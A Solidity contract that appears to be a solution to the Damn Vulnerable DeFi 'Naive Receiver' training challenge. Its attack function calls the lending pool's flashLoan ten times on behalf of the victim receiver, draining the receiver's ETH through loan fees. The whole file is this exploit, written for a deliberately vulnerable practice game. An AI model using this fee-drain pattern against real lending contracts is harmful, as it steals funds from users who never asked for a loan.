// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {NaiveReceiverLenderPool,FlashLoanReceiver} from "./NaiveReceiverLenderPool.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract NaiveReceiverAttackContract {

    NaiveReceiverLenderPool niveReceiverLenderPool;
    FlashLoanReceiver naiveReceiver;


    function attack(address payable lenderAddress, address payable receiverAddress) payable external {
        niveReceiverLenderPool = NaiveReceiverLenderPool(lenderAddress);
        naiveReceiver = FlashLoanReceiver(receiverAddress);
        uint i =10;
        while(i>=1){
            niveReceiverLenderPool.flashLoan(naiveReceiver,niveReceiverLenderPool.ETH(),0,"0x");
            --i;
        }

    }
}
